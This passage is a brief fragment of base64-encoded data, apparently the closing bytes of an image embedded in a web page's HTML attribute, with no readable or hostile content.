Msz/bGRkBze7LrzLTGGMjITljJD6R7j/oMGzvU8fiIyMhvpveMWzcCKcJpN8PgsLukPpDuPxEZGRojmKRYvp/ywxwWh7x84yMi/aDi36Q//AKYvdN/1NHGTGRkM4fcnT1NRFk6O/wB4k/fX4xkZBDxKPPofZn9mn3F+EEx7GRkNzHF4mRkZGREtP//Z">
